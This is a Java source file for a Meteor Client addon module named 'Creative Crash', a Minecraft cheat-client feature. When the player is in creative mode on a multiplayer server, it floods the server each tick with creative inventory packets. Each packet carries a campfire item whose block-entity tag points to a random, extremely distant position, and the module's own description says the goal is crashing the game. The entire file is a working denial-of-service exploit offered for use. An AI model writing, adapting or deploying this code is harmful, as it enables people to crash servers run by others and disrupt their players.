package com.crystaldevs.crystal.modules.crash;

import com.crystaldevs.crystal.CrystalAddon;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;
import java.util.Random;
import java.util.concurrent.atomic.AtomicReference;

public class CreativeCrash extends Module {

    private final Setting<Integer> amount;

    private final Setting<Boolean> autoDisable;

    public CreativeCrash() {
        super(CrystalAddon.CRYSTAL_CRASH_CATEGORY.get(), "Creative Crash", "CRYSTAL || Tries crashing the game while in Creative Mode.");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("Packets per tick")
            .defaultValue(15)
            .min(1)
            .sliderMax(100)
            .build());
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if(!mc.isInSingleplayer()) {
            assert mc.player != null;
            if(!mc.player.getAbilities().creativeMode) {
                toggle();
                ChatUtils.info("Cannot do CreativeDupe in survival / spectator mode.");
            }
            if (mc.player != null) {
                mc.player.getAbilities();
            }

            Vec3d pos;
            pos = pickRandomPos();
            NbtCompound tag;
            tag = new NbtCompound();
            NbtList list = new NbtList();
            ItemStack the = new ItemStack(Items.CAMPFIRE);
            double[] doubles = new double[]{pos.x, pos.y, pos.z};
            {
                int i = 0, doublesLength = doubles.length;
                while (true) {
                    if (i < doublesLength) {
                        double v = doubles[i];
                        list.add(NbtDouble.of(v));
                        i++;
                    } else {
                        break;
                    }
                }
            }
            tag.put("Pos", list);
            the.setSubNbt("BlockEntityTag", tag);
            int bound = amount.get();
            int i = 0;
            do {
                if (i < bound) {
                    Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new CreativeInventoryActionC2SPacket(1, the));
                    i++;
                } else {
                    break;
                }
            } while (true);
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }

    private Vec3d pickRandomPos() {
        AtomicReference<Vec3d> vec3d = new AtomicReference<>(new Vec3d(new Random().nextInt(0xFFFFFF), 255, new Random().nextInt(0xFFFFFF)));
        return vec3d.get();
    }
}
